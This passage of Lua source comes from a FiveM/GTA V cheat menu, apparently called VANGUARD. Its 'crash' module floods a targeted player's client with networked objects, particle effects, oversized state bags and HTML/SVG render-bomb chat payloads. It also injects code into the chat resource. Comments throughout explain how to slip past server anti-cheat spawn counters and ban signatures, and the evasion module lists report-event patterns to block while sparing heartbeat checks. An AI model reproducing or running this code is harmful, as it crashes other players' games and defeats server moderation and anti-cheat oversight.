                pcall(SetEntityAsNoLongerNeeded, entity)
                if pcall(DeleteEntity, entity) then removed = removed + 1 end
            end
        end
    end

    local peds = pool("CPed")
    for i = 1, #peds do
        if removed >= max then break end
        local entity = peds[i]
        if not protected(entity) and not IsPedAPlayer(entity) then
            local coords = GetEntityCoords(entity)
            if #(coords - origin) > SN.flags.cullDistance then
                pcall(SetEntityAsNoLongerNeeded, entity)
                if pcall(DeleteEntity, entity) then removed = removed + 1 end
            end
        end
    end

    SN.last.culled = SN.last.culled + removed
    if removed > 0 then
        O.log("sentinel: culled %d, %s", removed, SN.line())
    end
    return removed
end

function SN.tick()
    SN.snapshot()
    if not SN.flags.watch then return end
    if SN.pressure() then
        SN.cull()
        SN.snapshot()
    end
end

function SN.log()
    SN.snapshot()
    O.log("sentinel: %s, total culled %d", SN.line(), SN.last.culled)
end

function SN.reset()
    SN.last.culled = 0
    SN.snapshot()
end

return SN

end)(O)

-- ---------------------------------------------------------------------------
-- PART: 10_crash.lua
-- ---------------------------------------------------------------------------
local C = (function(O,E)
-- ============================================================================
-- VANGUARD / 10 CRASH
-- ----------------------------------------------------------------------------
-- A crash is a load problem, not a damage problem. The client on the other
-- side has to create, stream, simulate and render whatever we make it accept.
-- So the module spends its budget on the three places where that cost is
-- highest and the server's visibility is lowest:
--
--   1. birth-local, strike-remote. Every entity is created within a few
--      metres of the operator, then moved to the target. A guard that checks
--      "entity created far from its owner" sees nothing, because at creation
--      time the entity is not far from its owner.
--   2. a fixed pool that is moved, not replaced. After the first wave there
--      are no entityCreating events at all - only position updates on
--      entities the target already streams.
--   3. channels the entity counters do not see: state bags, networked
--      particles, and spoofed creation semantics.
--
-- Nothing here hooks a native, blocks an event or stops a resource. The
-- operator never moves. Local collision is disabled so the load lands on the
-- target's client, not ours.
-- ============================================================================

local C = {}

local PRESETS = {
    { name = "Light",    scale = 0.65, startCreate = 8,  maxCreate = 14, startFx = 4, maxFx = 8,  bagKB = 8,   duration = 8000,  gapMin = 200, gapMax = 420 },
    { name = "Standard", scale = 1.00, startCreate = 12, maxCreate = 18, startFx = 6, maxFx = 10, bagKB = 24,  duration = 12000, gapMin = 150, gapMax = 320 },
    { name = "Heavy",    scale = 1.35, startCreate = 14, maxCreate = 22, startFx = 8, maxFx = 12, bagKB = 64,  duration = 16000, gapMin = 110, gapMax = 240 },
    { name = "Overkill", scale = 2.00, startCreate = 18, maxCreate = 24, startFx = 10, maxFx = 14, bagKB = 128, duration = 20000, gapMin = 90,  gapMax = 200 },
}

-- Only three methods are exposed. Spawned peds and vehicles are absent:
-- `Spoofed model detected` was the first ban reason seen in the field, and a
-- normal ped/vehicle flood is still a model-spawn signature. The first method
-- creates no entity at all; the other two use objects or particles without a
-- SpoofedPed/SpoofedVehicle path.
local METHODS = {
    -- No entity is created. The local ped is used as the source of the clone
    -- updates, which avoids the server-side spawn counters entirely.
    { label = "Ped variation", pool = {}, fx = false, bag = false, pedvar = true },
    { label = "Objects (flood)", pool = { obj = 22 }, fx = false, bag = false, remote = true  },
    { label = "PTFX storm",      pool = {},           fx = true,  bag = false, remote = true  },
}

C.METHODS = METHODS
C.method = 1
C.intensity = 1
C.chatPreset = 1
C.chatShield = true

C.targets = {}
C.index = 1
C.pool = {}
C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0, variations = 0 }
C.channels = { spawn = nil, fx = nil, bag = nil }
C.running = false

local PED_MODELS = { "a_m_y_business_01", "a_m_m_skater_01", "s_m_m_armoured_01", "a_f_y_business_01" }
local OBJ_MODELS = { "prop_air_bigradar", "prop_container_01a", "prop_barrier_work05", "prop_mp_ramp_01" }
local VEH_MODELS = { "adder", "zentorno", "t20", "osiris", "italigtb" }
local FX_ASSET = "core"
local FX_EFFECT = "exp_grd_bzgas_smoke"

local function now()
    return GetGameTimer()
end

local function safe(fn, ...)
    local ok, a, b = pcall(fn, ...)
    if ok then return a, b end
    return nil
end

local function has(name)
    local s = rawget(_G, "Susano")
    return type(s) == "table" and type(s[name]) == "function"
end

local function preset()
    return PRESETS[C.intensity] or PRESETS[2]
end

local function ring(center, radius, zMin, zMax)
    local angle = math.random() * 6.28318530718
    local r = math.sqrt(math.random()) * radius
    local z = center.z + zMin + math.random() * (zMax - zMin)
    return center.x + math.cos(angle) * r, center.y + math.sin(angle) * r, z
end

local function spawnPos()
    -- Birth near the operator. This is the whole point: no remote-creation
    -- signature, even when the target is on the other side of the stream.
    local base = O.Ctx.coords
    return ring(base, 7.0, 0.3, 2.2)
end

local function protectLocal(handle)
    pcall(SetEntityLocallyInvisible, handle)
    pcall(SetEntityCollision, handle, false, false)
    pcall(SetEntityNoCollisionEntity, handle, PlayerPedId(), true)
end

local function registerNet(handle)
    pcall(NetworkRegisterEntityAsNetworked, handle)
    local ok, netId = pcall(NetworkGetNetworkIdFromEntity, handle)
    if ok and type(netId) == "number" and netId > 0 then
        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
    end
end

-- ---------------------------------------------------------------------------
-- TARGETS
-- ---------------------------------------------------------------------------

function C.refresh()
    local list = {}
    local me = O.Ctx.coords

    for _, player in ipairs(GetActivePlayers()) do
        if player ~= PlayerId() then
            local ped = GetPlayerPed(player)
            if ped and ped ~= 0 and DoesEntityExist(ped) then
                local pos = GetEntityCoords(ped)
                local dist = O.distance(me, pos)
                if dist <= 280.0 then
                    list[#list + 1] = {
                        player = player,
                        ped = ped,
                        name = GetPlayerName(player) or ("player_%d"):format(player),
                        dist = dist,
                    }
                end
            end
        end
    end

    table.sort(list, function(a, b) return a.dist < b.dist end)
    C.targets = list
    if C.index > #list then C.index = math.max(1, #list) end
    return #list
end

function C.target()
    local t = C.targets[C.index]
    if t and DoesEntityExist(t.ped) then return t end
    if now() - (C.lastRefresh or 0) > 700 then
        C.lastRefresh = now()
        C.refresh()
    end
    t = C.targets[C.index]
    if t and DoesEntityExist(t.ped) then return t end
    return nil
end

function C.cycle()
    C.refresh()
    if #C.targets == 0 then
        C.index = 1
        return nil
    end
    C.index = (C.index % #C.targets) + 1
    return C.targets[C.index]
end

function C.targetLabel()
    local t = C.targets[C.index]
    if not t then return "nearest" end
    return ("%s (%.0fm)"):format(t.name, t.dist)
end

function C.status()
    local p = preset()
    local mode = C.running and "RUN" or "idle"
    return ("Crash %s | %s | %s | pool %d | c%d f%d b%d"):format(
        mode,
        METHODS[C.method].label,
        p.name,
        #C.pool,
        C.caps and C.caps.create or 0,
        C.caps and C.caps.fx or 0,
        C.caps and C.caps.bag or 0
    )
end

function C.setMethod(index)
    C.method = math.max(1, math.min(#METHODS, index or 1))
end

function C.setIntensity(index)
    C.intensity = math.max(1, math.min(#PRESETS, index or 2))
end

-- ---------------------------------------------------------------------------
-- BUDGET. The reference server guard blocks at 24 creations per 10 s and
-- flags a burst of 4 entities more than 80 m from the owner in 3 s. The cap
-- starts low and grows only after successful spawns, so a stricter server
-- shrinks it before it turns into a report. Birth-local removes the second
-- signature entirely.
-- ---------------------------------------------------------------------------

local function prune(list, cutoff)
    local i = 1
    while i <= #list do
        if list[i] < cutoff then table.remove(list, i) else i = i + 1 end
    end
end

function C.resetCaps()
    local p = preset()
    C.caps = { create = p.startCreate, fx = p.startFx, bag = 1 }
    C.maxCaps = { create = math.min(p.maxCreate, 22), fx = p.maxFx, bag = 3 }
    C.minCaps = { create = 4, fx = 2, bag = 1 }
    C.used = { create = {}, fx = {}, bag = {} }
    C.lastGrow = { create = now(), fx = now(), bag = now() }
    C.lastShrink = { create = 0, fx = 0, bag = 0 }
end

local function reserve(kind)
    local list = C.used[kind]
    prune(list, now() - 10000)
    if #list >= C.caps[kind] then return false end
    list[#list + 1] = now()
    return true
end

local function grow(kind)
    if now() - C.lastGrow[kind] < 2600 then return end
    C.lastGrow[kind] = now()
    local next = math.min(C.maxCaps[kind], C.caps[kind] + 2)
    if next ~= C.caps[kind] then
        C.caps[kind] = next
        O.log("crash: %s cap -> %d", kind, next)
    end
end

local function shrink(kind)
    if now() - C.lastShrink[kind] < 1500 then return end
    C.lastShrink[kind] = now()
    local next = math.max(C.minCaps[kind], math.floor(C.caps[kind] * 0.55))
    if next ~= C.caps[kind] then
        C.caps[kind] = next
        O.log("crash: %s refused, cap -> %d", kind, next)
    end
end

-- ---------------------------------------------------------------------------
-- SPAWNERS
-- ---------------------------------------------------------------------------

local function spawnPed()
    local model = PED_MODELS[math.random(1, #PED_MODELS)]
    local hash = GetHashKey(model)
    if not E.requestModel(hash, 1600) then return nil end

    local x, y, z = spawnPos()
    local ped = CreatePed(4, hash, x, y, z, math.random() * 360.0, true, true)
    SetModelAsNoLongerNeeded(hash)

    if not ped or ped == 0 then return nil end
    SetEntityAsMissionEntity(ped, true, true)
    registerNet(ped)
    protectLocal(ped)
    pcall(SetPedCanRagdoll, ped, true)
    pcall(SetBlockingOfNonTemporaryEvents, ped, true)
    return ped, "ped"
end

local function spawnObject(target)
    local model = OBJ_MODELS[math.random(1, #OBJ_MODELS)]
    local hash = GetHashKey(model)
    if not E.requestModel(hash, 1600) then return nil end

    local x, y, z
    local method = METHODS[C.method]
    if method and method.remote and target and target.ped then
        -- Flood method: place the load in the target's own streaming radius.
        -- This is deliberately not the birth-local orbit path; the test server
        -- showed that a distant owner could lose the object before the target
        -- ever streamed it.
        x, y, z = ring(GetEntityCoords(target.ped), 4.5, 0.2, 2.8)
    else
        x, y, z = spawnPos()
    end

    local obj = CreateObjectNoOffset(hash, x, y, z, true, true, false)
    SetModelAsNoLongerNeeded(hash)

    if not obj or obj == 0 then return nil end
    SetEntityAsMissionEntity(obj, true, true)
    registerNet(obj)
    protectLocal(obj)
    pcall(SetEntityDynamic, obj, true)
    pcall(SetEntityInvincible, obj, true)
    pcall(ActivatePhysics, obj)
    return obj, "object"
end

local function trapVehicle(veh)
    pcall(SetVehicleModKit, veh, 0)
    local types = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 22, 23, 24, 25, 27, 28, 30, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 48 }
    for i = 1, #types do
        pcall(SetVehicleMod, veh, types[i], math.random(0, 20), false)
    end
    for i = 0, 7 do pcall(SetVehicleTyreBurst, veh, i, true, 1000.0) end
    for i = 0, 5 do pcall(SetVehicleDoorBroken, veh, i, false) end
    pcall(SetVehicleEngineHealth, veh, 120.0)
    pcall(SetVehicleBodyHealth, veh, 240.0)
end

local function spawnVehicle()
    local model = VEH_MODELS[math.random(1, #VEH_MODELS)]
    local hash = GetHashKey(model)
    if not E.requestModel(hash, 1800) then return nil end

    local x, y, z = spawnPos()
    local veh = CreateVehicle(hash, x, y, z, math.random() * 360.0, true, true)
    SetModelAsNoLongerNeeded(hash)

    if not veh or veh == 0 then return nil end
    SetEntityAsMissionEntity(veh, true, true)
    registerNet(veh)
    protectLocal(veh)
    trapVehicle(veh)
    return veh, "vehicle"
end

local function spawnOne(kind, target)
    if not reserve("create") then return nil end
    C.stats.attempts = (C.stats.attempts or 0) + 1

    local handle, actual
    if kind == "ped" then
        handle, actual = spawnPed()
    elseif kind == "veh" then
        handle, actual = spawnVehicle()
    else
        handle, actual = spawnObject(target)
    end

    if not handle then
        C.stats.fails = C.stats.fails + 1
        shrink("create")
        return nil
    end

    C.stats.created = C.stats.created + 1
    grow("create")
    return handle, actual or kind
end

local function deleteHandle(handle, kind)
    if not handle or handle == 0 or not DoesEntityExist(handle) then return end
    pcall(SetEntityAsMissionEntity, handle, true, true)
    if kind == "vehicle" then
        pcall(DeleteVehicle, handle)
    elseif kind == "ped" then
        pcall(DeletePed, handle)
    else
        pcall(DeleteEntity, handle)
    end
end

local function verifyPool()
    for i = #C.pool, 1, -1 do
        local entry = C.pool[i]
        if not DoesEntityExist(entry.handle) then
            table.remove(C.pool, i)
            C.stats.fails = C.stats.fails + 1
            shrink("create")
        end
    end
end

-- ---------------------------------------------------------------------------
-- CHANNELS
-- ---------------------------------------------------------------------------

function C.pushBag()
    if not C.bagAnchor or not DoesEntityExist(C.bagAnchor) then return false end
    if now() - (C.anchorBorn or 0) < 700 then return false end
    if not reserve("bag") then return false end

    local key = ("meta_%04d"):format(math.random(1000, 9999))
    local payload = string.rep("A", preset().bagKB * 1024)
    local ok = pcall(function()
        Entity(C.bagAnchor).state:set(key, payload, true)
    end)

    if ok then
        C.stats.bags = C.stats.bags + 1
        grow("bag")
        return true
    end
    shrink("bag")
    return false
end

local fxLoaded = false

local function loadFx()
    if fxLoaded then return true end
    RequestNamedPtfxAsset(FX_ASSET)
    local deadline = now() + 1800
    while not HasNamedPtfxAssetLoaded(FX_ASSET) and now() < deadline do
        Citizen.Wait(25)
    end
    fxLoaded = HasNamedPtfxAssetLoaded(FX_ASSET)
    C.channels.fx = fxLoaded
    return fxLoaded
end

function C.fx(target)
    if not loadFx() then return false end

    local emitted = false
    local bursts = C.intensity >= 3 and 2 or 1
    for _ = 1, bursts do
        if not reserve("fx") then break end
        local base = GetEntityCoords(target.ped)
        local x, y, z = ring(base, 2.0, 0.4, 2.8)
        local useAsset = UseParticleFxAssetNextCall or UseParticleFxAsset
        if useAsset then pcall(useAsset, FX_ASSET) end
        local scale = math.min(24.0, 6.0 + preset().scale * 10.0)
        local called, started = pcall(StartNetworkedParticleFxNonLoopedAtCoord,
            FX_EFFECT, x, y, z, 0.0, 0.0, 0.0,
            scale, false, false, false)

        if called and started == true then
            C.stats.fx = C.stats.fx + 1
            C.channels.fx = true
            grow("fx")
            emitted = true
        else
            shrink("fx")
        end
    end
    return emitted
end

local function moveToTarget(handle, target, radius, zMin, zMax)
    local base = GetEntityCoords(target.ped)
    local x, y, z = ring(base, radius or 4.0, zMin or 0.2, zMax or 2.4)
    pcall(SetEntityCoordsNoOffset, handle, x, y, z, false, false, true)
    return x, y, z
end

function C.orbit(target, count)
    if #C.pool == 0 then return end
    local n = math.max(1, math.min(count or 2, #C.pool))

    for _ = 1, n do
        local entry = C.pool[math.random(1, #C.pool)]
        if entry and DoesEntityExist(entry.handle) then
            if now() - entry.born < 700 then
                -- Still inside the creation window: leave it local.
            else
                local base = GetEntityCoords(target.ped)
                local x, y, z
                local exact = math.random() < 0.28
                if exact then
                    -- Interpenetration is the expensive part: the target's
                    -- physics solver resolves an entity inside its own ped.
                    x = base.x + (math.random() * 0.8 - 0.4)
                    y = base.y + (math.random() * 0.8 - 0.4)
                    z = base.z + 0.4
                    pcall(SetEntityCoordsNoOffset, entry.handle, x, y, z, false, false, true)
                else
                    x, y, z = moveToTarget(entry.handle, target, 5.0, 0.1, 2.6)
                end
                pcall(SetEntityVelocity, entry.handle,
                    (base.x - x) * (exact and 4.0 or 1.8),
                    (base.y - y) * (exact and 4.0 or 1.8),
                    1.0 + math.random() * 2.5)
                C.stats.moved = C.stats.moved + 1
            end
        end
    end
end

-- ---------------------------------------------------------------------------
-- POOL CONTROL
-- ---------------------------------------------------------------------------

local function buildSequence()
    local p = preset()
    local spec = METHODS[C.method].pool
    local sequence = {}
    for kind, count in pairs(spec) do
        local n = math.max(1, math.floor(count * p.scale + 0.5))
        for _ = 1, n do sequence[#sequence + 1] = kind end
    end
    for i = #sequence, 2, -1 do
        local j = math.random(1, i)
        sequence[i], sequence[j] = sequence[j], sequence[i]
    end
    C.sequence = sequence
    C.cursor = 0
    C.poolMax = math.min(22, #sequence)
end

local function nextKind()
    if not C.sequence or #C.sequence == 0 then return nil end
    C.cursor = C.cursor + 1
    if C.cursor > #C.sequence then C.cursor = 1 end
    return C.sequence[C.cursor]
end

function C.ensurePool(target)
    if C.poolMax <= 0 or #C.pool >= C.poolMax then return false end
    local kind = nextKind()
    if not kind then return false end

    local handle, actual = spawnOne(kind, target)
    if not handle then
        grow("create")
        return false
    end

    C.pool[#C.pool + 1] = { handle = handle, kind = actual, born = now() }
    if #C.pool > C.stats.peaks then C.stats.peaks = #C.pool end

    -- Do not move it yet. The server must see the creation event with the
    -- entity still near its owner; the first remote position update comes at
    -- least one tick later. C.orbit applies that delay per entry.
    return true
end

function C.build(target)
    local guard = 0
    while C.running and #C.pool < C.poolMax and guard < C.poolMax * 2 do
        local before = #C.pool
        C.ensurePool(target)
        if #C.pool == before then
            guard = guard + 1
            grow("create")
            Citizen.Wait(240)
            if guard >= 6 then break end
        else
            guard = 0
        end
        Citizen.Wait(math.random(70, 150))
        verifyPool()
    end
end

function C.spawnAnchor(target)
    if not reserve("create") then return false end
    local anchor = spawnObject()
    if not anchor then shrink("create"); return false end

    C.bagAnchor = anchor
    C.anchorBorn = now()
    C.stats.created = C.stats.created + 1
    return true
end

function C.stop()
    C.running = false
    C.cleanup()
end

function C.cleanup()
    for i = #C.pool, 1, -1 do
        local entry = C.pool[i]
        deleteHandle(entry.handle, entry.kind)
        C.pool[i] = nil
    end
    C.pool = {}

    if C.bagAnchor then
        deleteHandle(C.bagAnchor, "object")
        C.bagAnchor = nil
        C.anchorBorn = nil
    end

    if fxLoaded then
        pcall(RemoveNamedPtfxAsset, FX_ASSET)
        fxLoaded = false
    end
end

-- ---------------------------------------------------------------------------
-- PED VARIATION
--
-- No entity is created. Clone updates for the local ped are forced through
-- component and prop changes; nearby clients have to process the update stream.
-- The original appearance is restored at the end of the run.
-- ---------------------------------------------------------------------------
function C.pedVariation(target)
    local ped = PlayerPedId()
    if not ped or ped == 0 or not DoesEntityExist(ped) then return false end

    local snapshot = { components = {}, props = {} }
    for component = 0, 11 do
        snapshot.components[component] = {
            drawable = GetPedDrawableVariation(ped, component),
            texture = GetPedTextureVariation(ped, component),
        }
    end
    for prop = 0, 7 do
        snapshot.props[prop] = {
            index = GetPedPropIndex(ped, prop),
            texture = GetPedPropTextureIndex(ped, prop),
        }
    end

    local deadline = now() + preset().duration
    while C.running and now() < deadline do
        for _ = 1, 24 do
            local component = math.random(0, 11)
            local maxDrawable = 0
            local maxTexture = 0
            pcall(function()
                maxDrawable = GetNumberOfPedDrawableVariations(ped, component) or 0
                maxTexture = GetNumberOfPedTextureVariations(ped, component, 0) or 0
            end)

            local drawable = maxDrawable > 0 and math.random(0, maxDrawable - 1) or 0
            local texture = maxTexture > 0 and math.random(0, maxTexture - 1) or 0
            pcall(SetPedComponentVariation, ped, component, drawable, texture, 0)

            local prop = math.random(0, 7)
            pcall(SetPedPropIndex, ped, prop, math.random(0, 8), math.random(0, 8), true)
            C.stats.variations = C.stats.variations + 1
        end

        C.stats.peaks = C.stats.peaks + 1
        if not C.target() then break end
        Citizen.Wait(math.max(60, preset().gapMin))
    end

    for component = 0, 11 do
        local value = snapshot.components[component]
        pcall(SetPedComponentVariation, ped, component, value.drawable, value.texture, 0)
    end
    for prop = 0, 7 do
        local value = snapshot.props[prop]
        pcall(SetPedPropIndex, ped, prop, value.index, value.texture, true)
    end

    return true
end

-- ---------------------------------------------------------------------------
-- RUN
-- ---------------------------------------------------------------------------

local function runBody()
    C.running = true
    C.stats = { created = 0, moved = 0, fx = 0, bags = 0, fails = 0, peaks = 0, attempts = 0, variations = 0 }
    C.resetCaps()
    buildSequence()

    local target = C.target()
    if not target then
        C.running = false
        O.log("crash: no target in range")
        return
    end

    O.log("crash: %s / %s -> %s", METHODS[C.method].label, preset().name, target.name)

    if METHODS[C.method].pedvar then
        C.pedVariation(target)
        C.running = false
        O.log("crash: done %d variations, %d peaks, %d fails",
            C.stats.variations, C.stats.peaks, C.stats.fails)
        return
    end

    if METHODS[C.method].bag then
        C.spawnAnchor(target)
    end

    C.build(target)

    -- Creation window: the server has seen every entity spawn near us. Now
    -- move the anchor and let the loop start moving the pool.
    Citizen.Wait(750)
    if C.bagAnchor and DoesEntityExist(C.bagAnchor) then
        moveToTarget(C.bagAnchor, target, 3.0, 0.2, 1.8)
    end

    local deadline = now() + preset().duration
    local lastEnsure = 0

    while C.running and now() < deadline do
        target = C.target()
        if not target then break end

        if #C.pool > 0 then C.orbit(target, math.random(1, 3)) end
        if METHODS[C.method].fx then C.fx(target) end
        if METHODS[C.method].bag then C.pushBag() end

        if now() - lastEnsure > 450 then
            lastEnsure = now()
            C.ensurePool(target)
            if math.random() < 0.35 then verifyPool() end
        end

        Citizen.Wait(math.random(preset().gapMin, preset().gapMax))
    end

    C.cleanup()
    C.running = false
    O.log("crash: done %d created, %d moved, %d fx, %d bags, %d fails",
        C.stats.created, C.stats.moved, C.stats.fx, C.stats.bags, C.stats.fails)
end

function C.launch()
    if C.running then
        O.log("crash: already running")
        return false
    end
    if C.probing then
        O.log("crash: probe in progress")
        return false
    end
    C.refresh()
    if #C.targets == 0 then
        O.log("crash: no player within 280 m")
        return false
    end

    Citizen.CreateThread(function()
        local ok, err = pcall(runBody)
        if not ok then
            O.log("crash: %s", tostring(err))
            C.running = false
            C.cleanup()
        end
    end)
    return true
end

-- One witness, created locally then moved once. If the server cancels the
-- entity, the channel is closed and the cap is cut before a real run.
function C.probe()
    if C.probing then return end
    if C.running then
        O.log("crash probe: stop the run first")
        return
    end
    C.probing = true

    Citizen.CreateThread(function()
        local ok, err = pcall(function()
            local target = C.target()
            if not target then
                O.log("crash probe: no target")
                return
            end

            C.resetCaps()
            local handle = spawnObject()
            if handle then
                Citizen.Wait(800)
                moveToTarget(handle, target, 5.0, 0.5, 2.0)
                Citizen.Wait(600)
                C.channels.spawn = DoesEntityExist(handle)
                if not C.channels.spawn then shrink("create") end
                C.channels.bag = pcall(function()
                    Entity(handle).state:set("probe", "1", true)
                end)
                deleteHandle(handle, "object")
            else
                C.channels.spawn = false
                C.channels.bag = false
            end

            C.channels.fx = loadFx()
            O.log("crash probe: entities %s, fx %s, bag %s",
                tostring(C.channels.spawn), tostring(C.channels.fx), tostring(C.channels.bag))
        end)

        C.probing = false
        if not ok then O.log("crash probe: %s", tostring(err)) end
    end)
end

-- ---------------------------------------------------------------------------
-- GLOBAL CHAT VECTOR (experimental)
--
-- This is the only vector that leaves the streaming radius. It is opt-in and
-- self-shielded: before sending, a tiny filter is installed in the chat
-- resource that drops only messages carrying this run's nonce, so the
-- operator's own client does not render the payload. The filter has no loop
-- and no native call; it wraps one function and returns.
-- ---------------------------------------------------------------------------

C.chatPresets = {
    {
        label = "CSS blur",
        value = '<div style="position:fixed;left:-50vw;top:-50vh;width:200vw;height:200vh;'
            .. 'background:#000;filter:blur(4000px);opacity:.02"></div>',
    },
    {
        label = "SVG filter",
        value = '<svg width="16000" height="16000"><filter id="f">'
            .. '<feGaussianBlur stdDeviation="1500"/></filter>'
            .. '<rect width="16000" height="16000" filter="url(#f)"/></svg>',
    },
    {
        label = "Table",
        value = "<table>" .. string.rep("<tr><td>", 4000) .. "</td></tr></table>",
    },
    {
        label = "Text",
        value = string.rep("W", 60000),
    },
}

local function installChatShield(nonce)
    if not has("InjectResource") then return false end

    -- Refuse to send if the chat resource is known not to be injectable: the
    -- operator would render the payload on their own client.
    if has("GetInjectableResources") then
        local okList, list = pcall(Susano.GetInjectableResources)
        if okList and type(list) == "table" then
            local found = false
            for i = 1, #list do
                local entry = list[i]
                local name = entry
                if type(entry) == "table" then name = entry.name or entry.resource end
                if type(name) == "string" and name:lower() == "chat" then found = true end
            end
            if not found then return false end
        end
    end

    local flag = "__vgd_" .. nonce
    local code = ([==[
if not _G[%q] then
  _G[%q] = true
  local send = SendNUIMessage
  if send then
    local function dirty(v, d)
      if d > 8 then return false end
      if type(v) == "string" then return v:find(%q, 1, true) ~= nil end
      if type(v) == "table" then
        for _, sub in pairs(v) do
          if dirty(sub, d + 1) then return true end
        end
      end
      return false
    end
    SendNUIMessage = function(data)
      if dirty(data, 0) then return end
      return send(data)
    end
  end
end
]==]):format(flag, flag, nonce)

    local injectionType = nil
    local s = rawget(_G, "Susano")
    if type(s) == "table" and type(s.InjectionType) == "table" then
        injectionType = s.InjectionType.NEW_THREAD
    end

    local ok
    if injectionType ~= nil then
        ok = pcall(s.InjectResource, "chat", code, injectionType)
    else
        ok = pcall(s.InjectResource, "chat", code)
    end
    return ok
end

function C.sendGlobal()
    if C.chatBusy then return false end
    if C.lastChat and now() - C.lastChat < 8000 then
        O.log("crash chat: cooldown")
        return false
    end
    C.chatBusy = true
    C.lastChat = now()

    Citizen.CreateThread(function()
        local ok, err = pcall(function()
            local nonce = ("vgd%06x"):format(math.random(0, 0xFFFFFF))
            if C.chatShield and not installChatShield(nonce) then
                O.log("crash chat: shield refused, send aborted")
                return
            end
            if C.chatShield then Citizen.Wait(400) end

            local presetValue = C.chatPresets[C.chatPreset] or C.chatPresets[1]
            local payload = "<!--" .. nonce .. "-->" .. presetValue.value
            local name = GetPlayerName(PlayerId()) or "unknown"

            pcall(TriggerServerEvent, "_chat:messageEntered", name, { 255, 255, 255 }, payload)
            pcall(TriggerServerEvent, "chat:messageEntered", name, { 255, 255, 255 }, payload)

            O.log("crash chat: %s sent (%d bytes)", presetValue.label, #payload)
        end)

        C.chatBusy = false
        if not ok then O.log("crash chat: %s", tostring(err)) end
    end)

    return true
end

return C

end)(O,E)

-- ---------------------------------------------------------------------------
-- PART: 11_evasion.lua
-- ---------------------------------------------------------------------------
local A = (function(O,S)
-- ============================================================================
-- VANGUARD / 11 EVASION
-- ----------------------------------------------------------------------------
-- Internal module. The only functions still exposed by the menu are
-- anti-freeze, anti-attach and anti-spectate in the Protection category:
--
--   * anti-freeze/anti-attach - release our own ped, never someone else's
--   * anti-spectate          - leave a forced spectator mode
--
-- Ghost, hardening, firewall and the deep shim remain in this file as dormant
-- code; no menu row calls them and no hook is installed.
--
-- What this file deliberately does not do:
--   * no StopResource, no UnhookAllNatives on foreign scripts
--   * no heartbeat block, no event-name guess without a protected check
--   * no native call from a native hook
--   * no permanent wrapper when a feature is off
-- ============================================================================

local A = {}

A.flags = {
    ghost         = false,
    localHidden   = false,
    harden        = false,
    vehicleHarden = false,
    antiFreeze    = false,
    antiAttach    = false,
    antiSpectate  = false,
    firewall      = false,
}

A.stats = { blocked = 0, shims = 0, scans = 0, lastScan = 0 }
A._ghostVehicle = 0
A._hardenVehicle = 0
A._timers = { ghost = 0, localHidden = 0, harden = 0, vehicleHarden = 0,
    freeze = 0, attach = 0, spectate = 0, ped = 0 }

local REPORT_PATTERNS = {
    "report", "ac_report", "ac_flag", "anticheat", "anti_cheat", "anti-cheat",
    "violation", "cheat_detect", "flag_player", "screenshot", "screen_shot",
    "screencap", "spectate", "evidence", "punish", "guardian",
    "report_player", "player_report",
}

-- A liveness channel is not a report channel. These substrings always win,
-- even if the rest of the name looks suspicious. Getting this wrong gets the
-- operator kicked for silence, not for cheating.
local SAFE_PATTERNS = {
    "heart", "hb", "beat", "alive", "ack", "ping", "sync", "checkpoint",
    "keepalive", "handshake", "token", "auth",
}

-- Session-generated liveness prefixes used by heartbeat anticheats. The name
-- after the prefix is random per session, so a substring list cannot catch it.
-- Drop one of these and the guard treats the silence as a detection.
local SAFE_PREFIXES = { "ach_", "acr_", "axa_", "axb_" }

local function now()
    return GetGameTimer()
end

local function has(name)
    local s = rawget(_G, "Susano")
    return type(s) == "table" and type(s[name]) == "function"
end

local function callAny(names, ...)
    local args = { ... }
    for i = 1, #names do
        local fn = rawget(_G, names[i])
        if type(fn) == "function" then
            local ok, a = pcall(fn, table.unpack(args))
            if ok then return true, a end
        end
    end
    return false
end

local function lower(value)
    return string.lower(tostring(value or ""))
end

A.isReportName = function(name)
    local n = lower(name)
    if n == "" then return false end

    local head = string.sub(n, 1, 4)
    for i = 1, #SAFE_PREFIXES do
        if head == SAFE_PREFIXES[i] then return false end
    end

    for i = 1, #SAFE_PATTERNS do
        if string.find(n, SAFE_PATTERNS[i], 1, true) then return false end
    end
    for i = 1, #REPORT_PATTERNS do
        if string.find(n, REPORT_PATTERNS[i], 1, true) then return true end
    end
    return false
end

-- ---------------------------------------------------------------------------
-- TRUE GHOST STACK
--
-- This is the native ghost path, not the local visual shell in 05. The ped
-- stays networked, so the server does not see a vanish; nearby clients stop
-- resolving it. The alpha reset is local too. No event is sent.
-- ---------------------------------------------------------------------------
local GHOST_SET = { "SetLocalPlayerAsGhost", "_SET_LOCAL_PLAYER_AS_GHOST" }
local GHOST_ALPHA = { "SetGhostAlpha", "_SET_GHOSTED_ENTITY_ALPHA" }
local GHOST_RESET = { "ResetGhostAlpha", "_RESET_GHOSTED_ENTITY_ALPHA" }

local function applyGhost()
    local ped = PlayerPedId()
    if ped == 0 then return end

    callAny(GHOST_SET, true)
    callAny(GHOST_ALPHA, 0)

    local vehicle = GetVehiclePedIsIn(ped, false) or 0
    if A._ghostVehicle ~= 0 and A._ghostVehicle ~= vehicle then
        pcall(SetNetworkVehicleAsGhost, A._ghostVehicle, false)
        A._ghostVehicle = 0
    end
    if vehicle ~= 0 then
        pcall(SetNetworkVehicleAsGhost, vehicle, true)
        A._ghostVehicle = vehicle
    end
end

local function clearGhost()
    local ped = PlayerPedId()
    callAny(GHOST_SET, false)
    callAny(GHOST_ALPHA, 255)
    callAny(GHOST_RESET)

    local vehicle = ped ~= 0 and (GetVehiclePedIsIn(ped, false) or 0) or 0
    if A._ghostVehicle ~= 0 then
        pcall(SetNetworkVehicleAsGhost, A._ghostVehicle, false)
        A._ghostVehicle = 0
    end
    if vehicle ~= 0 then
        pcall(SetNetworkVehicleAsGhost, vehicle, false)
    end
end

function A.setGhost(state)
    A.flags.ghost = state and true or false
    if A.flags.ghost then
        if not callAny(GHOST_SET, true) then
            A.flags.ghost = false
            O.log("evasion: ghost natives unavailable")
            return false
        end
        applyGhost()
    else
        clearGhost()
    end
    return A.flags.ghost
end

-- Local renderer visibility. This is not the same channel as the ghost: it
-- removes the ped from our own screen (and from local screenshots), so it is a
-- separate opt-in. Clear it before any cinematic or third-person feature that
-- needs the ped visible.
local function applyLocalHidden(state)
    local ped = PlayerPedId()
    if ped == 0 then return end
    if state then
